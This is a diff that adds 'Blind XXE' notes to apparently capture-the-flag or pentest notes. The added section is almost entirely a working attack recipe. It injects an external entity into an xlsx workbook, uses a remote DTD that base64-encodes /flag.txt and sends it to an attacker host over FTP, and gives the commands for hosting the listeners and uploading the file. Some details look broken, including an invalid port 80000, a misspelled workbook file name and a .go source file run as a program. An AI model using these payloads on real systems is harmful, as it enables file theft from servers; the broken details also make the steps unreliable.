@@ -83,3 +83,44 @@ We can read flag.txt file or /etc/passwd file.
 		&file;
 	</X-Token>
 </data>
+_____________________________________________________________________________________________________________________________________________
+Blind XXE
+---------
+
+blind XXE injection
+--------------------
+
+1. delete original xlsx file(test.xlsx)
+2. inject XXE in /xl/workhook.xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://10.4.52.17:3333/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+
+3. combine all files in new xlsx file (7z u evil.xlsx *)
+4. create xxe.dtd file
+
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp://10.4.52.17:2121/%d;'>"> 
+
+5. Install go 
+
+#wget https://github.com/actions/go-versions/releases/download/1.21.8-8166693630/go-1.21.8-linux-x64.tar.gz
+#sudo tar -C /usr/local -xzf go-1.21.8-linux-x64.tar.gz
+#export PATH=$PATH:/usr/local/go/bin
+#source ~/.profile
+
+6. host ftp_server
+
+#go mod init ./xxeftp.go
+#go build
+#./xxeftp.go -o files.log -p 2121 -w -wd public -wp 3333
+
+7. host http_server
+
+#python3 -m http.server 80000
+
+8. upload evil.xlsx file
+9. GET xxe.dtd  > xxe.dtd > ftp_server > file.log
+
